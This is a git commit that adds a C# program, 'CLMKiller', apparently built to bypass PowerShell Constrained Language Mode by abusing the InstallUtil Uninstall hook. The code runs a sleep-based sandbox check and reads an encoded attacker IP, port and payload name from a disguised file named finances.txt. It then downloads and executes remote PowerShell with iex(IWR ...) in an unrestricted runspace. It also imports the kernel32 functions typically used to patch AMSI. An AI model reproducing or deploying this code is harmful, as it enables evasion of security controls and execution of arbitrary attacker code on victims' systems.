a050b0768663b6e36c53e379dd5280df7fd124b3
GhostDuck <94322246+Zanitas404@users.noreply.github.com>
2023-10-11 21:19:49 +0200

    Add files via upload

---
+++ CLMInstaller/CLMInstaller/Program.cs
@@ -0,0 +1,149 @@
+﻿using System;
+using System.Threading;
+using System.Diagnostics;
+using System.IO;
+using System.Net;
+using System.Configuration.Install;
+using System.Collections.ObjectModel;
+using System.Runtime.InteropServices;
+using System.Management;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+using System.Text.RegularExpressions;
+using System.Runtime.InteropServices.WindowsRuntime;
+using System.Xml.Linq;
+
+namespace CLMKiller
+{
+
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            Console.WriteLine("GotchaBoi!");
+        }
+    }
+
+    [System.ComponentModel.RunInstaller(true)]
+    public class Sample : System.Configuration.Install.Installer
+    {
+        [DllImport("kernel32")]
+        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+        [DllImport("kernel32")]
+        public static extern IntPtr LoadLibrary(string name);
+
+        [DllImport("kernel32")]
+        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        static int Patcher()
+        {
+
+
+            return 0;
+
+        }
+
+        static int CompareTime(DateTime timeBefore)
+        {
+            double timeDiff = DateTime.Now.Subtract(timeBefore).TotalSeconds;
+            if (timeDiff < 5)
+            {
+                return 1;
+            }
+            else
+            {
+                return 0;
+            }
+        }
+        static void Kill(string url)
+        {
+            Runspace run = RunspaceFactory.CreateRunspace();
+
+            run.Open();
+            PowerShell shell = PowerShell.Create();
+            shell.Runspace = run;
+
+            String exec = $"iex(IWR -UseBasicParsing -URI '{url}' )";  // Mazbe add "-UseBasicParsing" to IWR
+            shell.AddScript(exec);
+            shell.Invoke();
+
+            Collection<PSObject> output = shell.Invoke();
+            foreach (PSObject o in output)
+            {
+                Console.WriteLine(o.ToString());
+            }
+
+            foreach (ErrorRecord err in shell.Streams.Error)
+            {
+                Console.Write("Error: " + err.ToString());
+            }
+            run.Close();
+        }
+        public override void Uninstall(System.Collections.IDictionary savedState)
+        {
+            Console.WriteLine("[*] Entering the nether");
+            DateTime rightnow = DateTime.Now;
+            Thread.Sleep(5000);
+
+            if (CompareTime(rightnow) == 1)
+            {
+                return;
+            }
+            Console.WriteLine("[*] Passed the time Vortex");
+
+            string pattern = @"^(\d+)_(\d+)_(\d+)_(\d+)_(\d+)_(\w+)$";
+            string result = "";
+
+            string filePath = @"C:\Windows\Tasks\finances.txt";
+            string command;
+
+            try
+            {
+                // Read the content of the file into the 'command' variable
+                command = File.ReadAllText(filePath);
+
+                // Display the content of the file
+                Console.WriteLine("Content of the file:");
+                Console.WriteLine(command);
+            }
+            catch (IOException e)
+            {
+                Console.WriteLine("An error occurred while reading the file: " + e.Message);
+                return;
+            }
+
+
+            Match match = Regex.Match(command, pattern);
+            if (match.Success)
+            {
+                // Extract and print the integer and string parts
+                string ipPartOctett1 = match.Groups[1].Value;
+                string ipPartOctett2 = match.Groups[2].Value;
+                string ipPartOctett3 = match.Groups[3].Value;
+                string ipPartOctett4 = match.Groups[4].Value;
+                string portPart = match.Groups[5].Value;
+                string payloadPart = match.Groups[6].Value;
+
+                if (portPart == "80")
+                {
+                    result = $"http://{ipPartOctett1.ToString()}.{ipPartOctett2.ToString()}.{ipPartOctett3.ToString()}.{ipPartOctett4.ToString()}/{payloadPart}";
+                }
+                else
+                {
+                    result = $"http://{ipPartOctett1.ToString()}.{ipPartOctett2.ToString()}.{ipPartOctett3.ToString()}.{ipPartOctett4.ToString()}:{portPart}/{payloadPart}";
+                }
+            }
+            else
+            {
+                Console.WriteLine("[!] You are not part of our clan.");
+                return;
+            }
+
+            Console.WriteLine("[*] About to kill it.");
+            Console.WriteLine(Patcher());
+            Kill(result);
+            return;
+        }
+    }
+}
